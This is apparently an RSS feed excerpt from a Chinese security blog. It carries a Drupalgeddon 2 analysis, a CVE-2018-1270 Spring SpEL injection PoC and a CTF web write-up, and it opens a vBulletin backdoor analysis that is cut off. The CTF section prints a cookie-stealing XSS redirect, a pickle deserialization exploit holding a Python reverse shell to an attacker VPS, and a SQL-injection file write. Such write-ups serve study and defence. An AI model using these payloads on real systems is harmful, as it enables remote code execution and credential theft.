&lt;p&gt;现在参数已经能够传进去了，那么在哪里执行呢？继续往下跟&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
	$form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
}
// Otherwise just add the new content class on a placeholder.
else {
	$form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
}

$status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
$form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
$output = $renderer-&amp;gt;renderRoot($form);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到经过&lt;code&gt;getValue()&lt;/code&gt;遍历出来的叶子节点(就是此时的&lt;code&gt;form&lt;/code&gt;)被传进&lt;code&gt;$renderer-&amp;gt;renderRoot()&lt;/code&gt;方法，跟进去看一下&lt;/p&gt;

&lt;p&gt;&lt;code&gt;core/lib/Drupal/Core/Render/Renderer.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  public function render(&amp;amp;$elements, $is_root_call = FALSE) {
...
    try {
      return $this-&amp;gt;doRender($elements, $is_root_call);
    }
    catch (\Exception $e) {
      // Mark the ::rootRender() call finished due to this exception &amp;amp; re-throw.
      $this-&amp;gt;isRenderingRoot = FALSE;
      throw $e;
    }
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;调用&lt;code&gt;doRender()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/6Htxw&#34; alt=&#34;doRender&#34; /&gt;
这个方法比较长，但是我们从中找到了几处执行&lt;code&gt;call_user_func()&lt;/code&gt;的地方，先看一下第三处&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (isset($elements[&#39;#post_render&#39;])) {
    foreach ($elements[&#39;#post_render&#39;] as $callable) {
        if (is_string($callable) &amp;amp;&amp;amp; strpos($callable, &#39;::&#39;) === FALSE) {
            $callable = $this-&amp;gt;controllerResolver-&amp;gt;getControllerFromDefinition($callable);
        }
        $elements[&#39;#children&#39;] = call_user_func($callable, $elements[&#39;#children&#39;], $elements);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接收的第一个参数&lt;code&gt;$elements[&#39;#post_render&#39;]&lt;/code&gt;作为函数，第二个参数&lt;code&gt;$elements[&#39;#children&#39;]&lt;/code&gt;作为参数，在上面被赋值&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!$theme_is_implemented &amp;amp;&amp;amp; isset($elements[&#39;#markup&#39;])) {
    $elements[&#39;#children&#39;] = Markup::create($elements[&#39;#markup&#39;] . $elements[&#39;#children&#39;]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两个参数都是我们可控的，于是造成一个代码执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/jHlV8&#34; alt=&#34;call_user_func&#34; /&gt;&lt;/p&gt;

&lt;p&gt;回头看一下这处&lt;code&gt;call_user_func_array&lt;/code&gt;，这里的&lt;code&gt;$callable&lt;/code&gt;和&lt;code&gt;$args&lt;/code&gt;两个参数实际上也是可控的，通过&lt;code&gt;#lazy_builder&lt;/code&gt;属性传进来，checkpoint的分析报告正是分析了这个地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Gj3xu&#34; alt=&#34;call_user_func_array&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h4&gt;

&lt;p&gt;关注这个漏洞也是好长时间了，当时粗略看了一下，因为补丁直接对入口进行了过滤，要找到真正触发的地方太难了，所以也迟迟不见PoC出来。checkpoint的分析报告出来后好好跟了一遍，不得不感叹人家真厉害(逃&amp;hellip;&lt;/p&gt;

&lt;p&gt;这个漏洞关键点有两个，一个是&lt;code&gt;uploadAjaxCallback&lt;/code&gt;里&lt;code&gt;$form_parents&lt;/code&gt;由get直接传进参数，这里就存在风险；
另一处&lt;code&gt;call_user_func&lt;/code&gt;两个参数均可控，两者结合造成一个严重的远程代码执行漏洞，看分析报告如何一步步构造利用链，可谓是十分精彩了。&lt;/p&gt;

&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/uncovering-drupalgeddon-2/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/a2u/CVE-2018-7600&#34;&gt;https://github.com/a2u/CVE-2018-7600&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-1270 spring-messaging Remote Code Execution 分析</title>
      <link>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</link>
      <pubDate>Wed, 11 Apr 2018 11:07:18 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://pivotal.io/security/cve-2018-1270&#34;&gt;CVE-2018-1270: Remote Code Execution with spring-messaging&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Spring Framework 5.0 to 5.0.4&lt;/li&gt;
&lt;li&gt;Spring Framework 4.3 to 4.3.15&lt;/li&gt;
&lt;li&gt;Older unsupported versions are also affected&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;

&lt;p&gt;在app.js中增加一个header头&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function connect() {
    var header  = {&amp;quot;selector&amp;quot;:&amp;quot;T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)&amp;quot;};
    var socket = new SockJS(&#39;/gs-guide-websocket&#39;);
    stompClient = Stomp.over(socket);
    stompClient.connect({}, function (frame) {
        setConnected(true);
        console.log(&#39;Connected: &#39; + frame);
        stompClient.subscribe(&#39;/topic/greetings&#39;, function (greeting) {
            showGreeting(JSON.parse(greeting.body).content);
        }, header);
    });
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;spring-boot:run运行，connect建立连接后，点击发送触发漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kVdWA&#34; alt=&#34;clac&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;

&lt;p&gt;在点击发送消息后，spring-message会对消息头部进行处理，相关方法在&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;
&lt;code&gt;addSubscriptionInternal()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/tvQk8&#34; alt=&#34;selector&#34; /&gt;
通过&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;确定一个&lt;code&gt;selector&lt;/code&gt;属性，后续服务端就通过这个&lt;code&gt;subsId&lt;/code&gt;来查找特定会话，也就是从&lt;code&gt;headers&lt;/code&gt;头部信息查找&lt;code&gt;selector&lt;/code&gt;，由&lt;code&gt;selector&lt;/code&gt;的值作为expression被执行&lt;/p&gt;

&lt;p&gt;点击Send后，&lt;code&gt;org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java&lt;/code&gt;接收到message，message的headers头部信息包含了selector的属性，message传进&lt;code&gt;this.subscriptionRegistry.findSubscriptions&lt;/code&gt;，由&lt;code&gt;findSubscriptions()&lt;/code&gt;进行处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NUWfs&#34; alt=&#34;sendMessageToSubscribers&#34; /&gt;&lt;/p&gt;

&lt;p&gt;跟进相关方法
&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
protected MultiValueMap&amp;lt;String, String&amp;gt; findSubscriptionsInternal(String destination, Message&amp;lt;?&amp;gt; message) {
	MultiValueMap&amp;lt;String, String&amp;gt; result = this.destinationCache.getSubscriptions(destination, message);
	return filterSubscriptions(result, message);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;result的值作为&lt;code&gt;filterSubscriptions()&lt;/code&gt;的&lt;code&gt;allMatches&lt;/code&gt;参数传入，遍历出&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;，此时的result为&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1AvIp&#34; alt=&#34;result&#34; /&gt;
跟进&lt;code&gt;filterSubscriptions()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;经过两层for循环，id为&lt;code&gt;sub-0&lt;/code&gt;的subscription被赋值给&lt;code&gt;sub&lt;/code&gt;(P.S. 此图是后来补的，故sessionId不一样)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wHSXE&#34; alt=&#34;for&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/QY3Ep&#34; alt=&#34;sub&#34; /&gt;
通过&lt;code&gt;sub.getSelectorExpression()&lt;/code&gt;得到&lt;code&gt;expression&lt;/code&gt;的值，此时的&lt;code&gt;expression&lt;/code&gt;就包含着我们发送的表达式&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/zwRxS&#34; alt=&#34;expression&#34; /&gt;&lt;/p&gt;

&lt;p&gt;再往下，执行到&lt;code&gt;expression.getValue()&lt;/code&gt;，SpEL得到执行，触发poc&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/vJ027&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-补丁&#34;&gt;0x06 补丁&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&#34;&gt;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&#34;&gt;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.nsfocus.net/spring-messaging-analysis/&#34;&gt;http://blog.nsfocus.net/spring-messaging-analysis/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/104140&#34;&gt;https://www.anquanke.com/post/id/104140&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>第二届强网杯Web部分 Writeup</title>
      <link>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</link>
      <pubDate>Tue, 27 Mar 2018 18:06:02 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</guid>
      <description>

&lt;p&gt;强网杯Web部分的题难度不小，还是比较有意思的，收获很大，这里简单分析一下其中两道题&lt;/p&gt;

&lt;h3 id=&#34;share-your-mind&#34;&gt;Share your mind&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;http://39.107.33.96:20000
Please help me find the vulnerability before I finish this site！
hint：xss bot使用phantomjs，版本2.1.1
hint2 : xss的点不在report页面
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据writeup描述，这是一道RPO攻击的题目，以前没接触过，趁机学习一波&lt;/p&gt;

&lt;p&gt;首先注册用户登录，查看源码，最后几行，可以看到引用js的时候这里使用了相对路径，构成RPO攻击的条件，简单尝试几个url发现确实可以利用。&lt;/p&gt;

&lt;p&gt;RPO攻击的原理可以参考&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&#34;&gt;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.nsfocus.net/rpo-attack/&#34;&gt;http://blog.nsfocus.net/rpo-attack/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226&lt;/code&gt;的时候加载&lt;code&gt;jquery.min.js&lt;/code&gt;的路径可以看到是正常的，&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oHZtz&#34; alt=&#34;jquery.js&#34; /&gt;
当访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php&lt;/code&gt;的时候浏览器尝试加载&lt;code&gt;..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js&lt;/code&gt;这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pa5qf&#34; alt=&#34;jquery.js&#34; /&gt;&lt;/p&gt;

&lt;p&gt;因为页面对一些特殊符号做了编码过滤，所以我们使用&lt;code&gt;String.fromCharCode()&lt;/code&gt;方法从ascii码来加载js&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;window.location.href=String.fromCharCode(some ascii code) + document.cookie;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SVQMd&#34; alt=&#34;md5&#34; /&gt;
这里有两个点的绕过：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;url部分做了同站检测，通过&lt;code&gt;http://39.107.33.96:20000@x.x.x.x&lt;/code&gt;的形式绕过&lt;/li&gt;
&lt;li&gt;这里的code每次刷新都是随机的，而且通过&lt;code&gt;===&lt;/code&gt;比较，没法通过弱类型绕过，所以我们生成所有6位字符的MD5，搜索前6位符合条件的就行(实际上生成了大约200M的文件基本够用了)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;根据提示要访问&lt;code&gt;/QWB_fl4g/QWB/&lt;/code&gt;页面，所以我们在vps上建一个带iframe的页面&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php&#39;&amp;gt;  
&amp;lt;iframe src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php/..%2f..%2f../index.php/view/article/1462/..%2f..%2f..%2f..%2findex.php&#39;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nc监听端口，xssbot会先访问&lt;code&gt;/QWB_fl4g/QWB/index.php&lt;/code&gt;，带上cookie后再访问article，触发xss，我们就能收到cookie&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yDw2L&#34; alt=&#34;flag&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;python-is-the-best-language-2&#34;&gt;python is the best language #2&lt;/h3&gt;

&lt;p&gt;考点：session处存在反序列化漏洞&lt;/p&gt;

&lt;p&gt;&lt;code&gt;app/others.py&lt;/code&gt; &lt;code&gt;FilterException&lt;/code&gt;类&lt;code&gt;load&lt;/code&gt;方法存在反序列化漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class FilterException(Exception):

    def __init__(self, value):
        super(FilterException, self).__init__(
            &#39;the callable object {value} is not allowed&#39;.format(value=str(value)))


def _hook_call(func):
    def wrapper(*args, **kwargs):
        print args[0].stack
        if args[0].stack[-2] in black_type_list:
            raise FilterException(args[0].stack[-2])
        return func(*args, **kwargs)
    return wrapper


def load(file):
    unpkler = Unpkler(file)
    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
    return Unpkler(file).load()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先测试一下序列化与反序列化过程可能产生的安全问题&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;序列化&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
from pickle import Pickler

class test(object):
    def __reduce__(self):
        return (os.system, (&#39;whoami&#39;))
evil = test()

def dump(file):
    pk = Pickler(file)
    pk.dump(evil)

with open(&#39;test&#39;, &#39;wb&#39;) as f:
    dump(f)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;会将python对象序列化成字符串写入文件，类似这个样子&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cnt
system
p0
(S&#39;whoami&#39;
p1
tp2
Rp3
.
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;反序列化&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pickle import Unpickler

def load(file):
    return Unpickler(file).load()

with open(&#39;test&#39;, &#39;rb&#39;) as f:
    load(f)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从文件读取进行反序列化，如果含有可执行的命令就会执行&lt;/p&gt;

&lt;p&gt;题目中对一些系统命令加入了黑名单，没法直接使用，但是这里可以用&lt;code&gt;subprocess&lt;/code&gt;、&lt;code&gt;commands&lt;/code&gt;等，同样是执行系统命令&lt;/p&gt;

&lt;p&gt;&lt;code&gt;load()&lt;/code&gt;方法并没有对传入的&lt;code&gt;file&lt;/code&gt;进行任何过滤，就会导致反序列化漏洞&lt;/p&gt;

&lt;p&gt;全局搜索一下调用&lt;code&gt;load()&lt;/code&gt;方法的部分&lt;/p&gt;

&lt;p&gt;&lt;code&gt;app/Mycache.py&lt;/code&gt;
&lt;code&gt;get()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def get(self, key):
    filename = self._get_filename(key)
    try:
        with open(filename, &#39;rb&#39;) as f:
            pickle_time = load(f)
            if pickle_time == 0 or pickle_time &amp;gt;= time():
                a = load(f)
                return a
            else:
                os.remove(filename)
                return None
    except (IOError, OSError, PickleError):
        return None
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;传入filename进行了load，跟进&lt;code&gt;_get_filename()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def _get_filename(self, key):
    if isinstance(key, text_type):
        key = key.encode(&#39;utf-8&#39;)  # XXX unicode review
    hash = md5(key).hexdigest()
    return os.path.join(self._path, hash)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到对key进行了MD5加密&lt;/p&gt;

&lt;p&gt;再搜索调用&lt;code&gt;get()&lt;/code&gt;方法的地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/S2Qaa&#34; alt=&#34;get()&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def open_session(self, app, request):
    sid = request.cookies.get(app.session_cookie_name)
    if not sid:
        sid = self._generate_sid()
        return self.session_class(sid=sid, permanent=self.permanent)
    if self.use_signer:
        signer = self._get_signer(app)
        if signer is None:
            return None
        try:
            sid_as_bytes = signer.unsign(sid)
            sid = sid_as_bytes.decode()
        except BadSignature:
            sid = self._generate_sid()
            return self.session_class(sid=sid, permanent=self.permanent)
    data = self.cache.get(self.key_prefix + sid)
    if data is not None:
        return self.session_class(data, sid=sid)
    return self.session_class(sid=sid, permanent=self.permanent)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现在&lt;code&gt;app/Mysessions.py&lt;/code&gt;处理session部分的方法调用了&lt;code&gt;get&lt;/code&gt;，传进去的参数是&lt;code&gt;self.key_prefix + sid&lt;/code&gt;，即&lt;code&gt;前缀+session&lt;/code&gt;值，类似这个样子
&lt;code&gt;bdwsessions855f1297-d81e-4366-aaaa-80c9edb87338&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;配置文件里看到&lt;code&gt;SESSION_FILE_DIR = &amp;quot;/tmp/ffff&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;所以整个流程大致是这样:&lt;/p&gt;

&lt;p&gt;用户注册或登录，取得cookie中的session值，加上前缀后再对文件名进行MD5加密，存储在&lt;code&gt;/tmp/ffff&lt;/code&gt;目录下&lt;/p&gt;

&lt;p&gt;在验证用户的过程中，对&lt;code&gt;/tmp/ffff&lt;/code&gt;目录相应文件名文件进行反序列化，假如我们对文件名和文件内容可控，那么就可以造成漏洞&lt;/p&gt;

&lt;p&gt;结合上一个sql注入漏洞，我们可以&lt;code&gt;select evilcode into outfile &#39;/tmp/ffff/md5&#39;;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在访问页面的时候修改session值为md5对应的明文，就可以让程序反序列化含有恶意代码的md5文件&lt;/p&gt;

&lt;p&gt;修改上面序列化代码:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import cPickle
import os
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (&amp;quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;vpsip\&amp;quot;,82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&#39;&amp;quot;,))
shellcode = cPickle.dumps(Exploit())
print &#39;0x&#39; + shellcode .encode(&#39;hex&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;假设我们要设置session为testabcd，对应的&lt;code&gt;bdwsessionstestabcd&lt;/code&gt;md5值为&lt;code&gt;209a05e8b11c8e74ab03c110e6e5d591&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;构造sql语句&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;select id from user where email = &#39;test&#39;/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/&#39;/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591&#39;#@test.com&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就把十六进制的恶意代码写入了&lt;code&gt;/tmp/ffff/&lt;/code&gt;下&lt;/p&gt;

&lt;p&gt;然后访问index，修改cookie的session值为&lt;code&gt;testabcd&lt;/code&gt;，触发反序列化漏洞后反弹shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/mYzKP&#34; alt=&#34;reverse_shell&#34; /&gt;&lt;/p&gt;

&lt;p&gt;总结：
- RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
- 反序列化问题一直都存在，这道题中虽然代码比较简单，利用起来还是有几个坑，还需要多学习&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>vBulletin 论坛定向攻击脚本分析</title>
      <link>https://kylingit.com/blog/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 05 Feb 2018 17:18:38 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;花了几天时间研究了一下Equation Group泄露的针对&lt;code&gt;vBulletin&lt;/code&gt;论坛的定向攻击工具，期间非常感谢&lt;a href=&#34;https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA&#34;&gt;风流@逢魔安全实验室&lt;/a&gt;的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考&lt;a href=&#34;https://paper.seebug.org/517/&#34;&gt;Equation Group泄露工具之vBulletin无文件后门分析&lt;/a&gt;进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。&lt;/p&gt;

&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不多。程序算得上比较古老，披露的漏洞也不算少，但是针对这个系统的集成利用工具还是非方程式这个莫属，攻击工具高度融合论坛本身的代码逻辑，无论是安插后门还是插入代理，全程都是无文件攻击，是真正“高级持续化威胁”的典型例子。&lt;/p&gt;

&lt;h3 id=&#34;0x02-脚本介绍&#34;&gt;0x02 脚本介绍&lt;/h3&gt;

&lt;p&gt;攻击脚本名为&lt;code&gt;funnelout.pl&lt;/code&gt;，在方程式工具包的&lt;code&gt;linux/up&lt;/code&gt;目录下，&lt;a href=&#34;https://github.com/x0rz/EQGRP&#34;&gt;github&lt;/a&gt;上有完整的解压缩后的文件，本文件&lt;a href=&#34;https://github.com/x0rz/EQGRP/blob/master/Linux/up/funnelout.v4.1.0.1.pl&#34;&gt;地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;它一共有三个版本，v3.0.0.1, v4.0.0.1和v4.1.0.1，内容上大同小异，新版本修改和增加了几处代码，我们就选择v4.1.0.1来研究。
脚本基于perl语言编写，x0rz给它的介绍是&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;FUNNELOUT: database-based web-backdoor for vbulletin&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以看出它是基于数据库的后门，也就是说攻击过程中不会生成文件，传统安全评估漏洞扫描之类的很难发现这种后门，再根据脚本生成的攻击代码中出现的一个时间戳&lt;code&gt;1258466920&lt;/code&gt;，推测开发时间大致在2009年11月份，如果真是这样，10年前的攻击工具现在看来依旧非常牛逼，用@风流的话来说“细思极恐”。&lt;/p&gt;

&lt;h3 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;funnelout.pl&lt;/code&gt;中涉及到的&lt;code&gt;vBulletin&lt;/code&gt;版本是3和4，所以我们选择&lt;code&gt;vBulletin v3.8.6&lt;/code&gt;来测试。提一句这套系统的代码好难找，官网仅开放下载给注册会员，而且现在已经更新到v5.x，所以需要代码的同学可以联系我。&lt;/p&gt;

&lt;p&gt;安装时在建立数据库的过程中可能出现设置默认日期&lt;code&gt;0000-00-00&lt;/code&gt;的错误，这应该和mysql的版本有关，可以选择低版本的mysql，也可以修改&lt;code&gt;upload\install\mysql-schema.php&lt;/code&gt;，将默认的&lt;code&gt;0000-00-00&lt;/code&gt;为&lt;code&gt;1000-01-01&lt;/code&gt;。&lt;/p&gt;

